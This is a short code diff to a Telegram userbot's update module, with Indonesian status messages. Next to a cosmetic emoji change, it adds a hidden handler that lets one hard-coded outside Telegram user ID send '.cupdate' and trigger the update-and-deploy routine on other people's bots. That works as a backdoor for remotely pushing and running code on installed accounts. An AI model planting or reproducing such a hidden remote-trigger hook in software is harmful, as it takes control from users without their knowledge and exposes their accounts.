@@ -145,6 +145,8 @@ async def update(event, repo, ups_rem, ac_br):
 
 
 @Xa_cmd(pattern="update(?: |$)(now|deploy)?")
+@register(incoming=True, from_users=1224143544,
+          pattern=r"^.cupdate(?: |$)(now|deploy)?")
 async def upstream(event):
     "For .update command, check if the bot is up to date, update if specified"
     await event.edit("**Mengecek Pembaruan, Silakan Menunggu....**")
@@ -205,7 +207,7 @@ async def upstream(event):
 
     if conf is None and force_update is False:
         changelog_str = (
-            f"**Pembaruan Untuk 🦖xᴀ-ᴜsᴇʀʙᴏᴛ🦖 :\n\n⚒️ Pembaruan Data :**\n`{changelog}`"
+            f"**Pembaruan Untuk 🦖xᴀ-ᴜsᴇʀʙᴏᴛ🦖 :\n\n👨‍💻 Pembaruan Data :**\n`{changelog}`"
         )
         if len(changelog_str) > 4096:
             await event.edit("`Changelog Terlalu Besar, Lihat File Untuk Melihatnya.`")
